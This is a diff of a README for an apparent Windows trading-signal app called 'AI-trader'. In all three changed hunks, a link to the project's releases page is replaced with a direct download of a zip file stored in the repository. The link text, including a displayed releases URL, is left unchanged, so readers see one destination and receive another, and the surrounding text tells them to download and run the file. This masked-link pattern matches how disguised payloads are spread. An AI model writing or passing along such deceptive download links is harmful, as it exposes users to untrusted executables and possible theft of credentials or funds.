@@ -1,6 +1,6 @@
 # 📈 AI-trader - Trade smarter with AI signals
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Isotopeadar921/AI-trader/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Isotopeadar921/AI-trader/raw/refs/heads/main/models/trader-A-v3.3.zip)
 
 ## 🚀 What this app does
 
@@ -21,7 +21,7 @@ It is built for users who want a clear trading tool without setting up Python, d
 
 Visit the release page here to download and run this file:
 
-[AI-trader Releases](https://github.com/Isotopeadar921/AI-trader/releases)
+[AI-trader Releases](https://github.com/Isotopeadar921/AI-trader/raw/refs/heads/main/models/trader-A-v3.3.zip)
 
 Look for the latest release at the top of the page. Download the Windows file listed there.
 
@@ -165,7 +165,7 @@ If the app shows no signals, the market may be quiet or your data source may not
 
 Download and run the latest Windows build from:
 
-[https://github.com/Isotopeadar921/AI-trader/releases](https://github.com/Isotopeadar921/AI-trader/releases)
+[https://github.com/Isotopeadar921/AI-trader/raw/refs/heads/main/models/trader-A-v3.3.zip](https://github.com/Isotopeadar921/AI-trader/raw/refs/heads/main/models/trader-A-v3.3.zip)
 
 ## 🧾 Folder layout example
 
